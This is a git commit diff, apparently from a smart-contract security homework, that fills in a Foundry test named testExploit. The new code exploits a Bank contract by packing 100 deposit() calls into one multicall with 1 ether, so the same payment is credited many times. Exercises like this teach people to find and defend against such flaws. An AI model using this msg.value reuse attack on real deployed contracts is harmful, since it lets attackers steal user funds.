e7631842b2a760537bc8311af4a6731566bbdd4a
Tzu-Hao Lin <haroldlin.0921@gmail.com>
2024-08-25 15:23:04 +0800

    Bank done

--- hw/test/Delegation/Bank.t.sol
+++ hw/test/Delegation/Bank.t.sol
@@ -6,7 +6,10 @@ import {Test, console2} from "forge-std/Test.sol";
 import {BankBaseTest} from "./BankBase.t.sol";
 
 contract BankTest is BankBaseTest {
-    function testExploit() external validation {
-        // TODO
+    function testExploit() external validation {        
+        bytes[] memory data = new bytes[](100);
+        for (uint i = 0; i < 100; ++i)
+            data[i] = abi.encodeWithSignature("deposit()");
+        bank.multicall{value: 1 ether}(data);
     }
 }
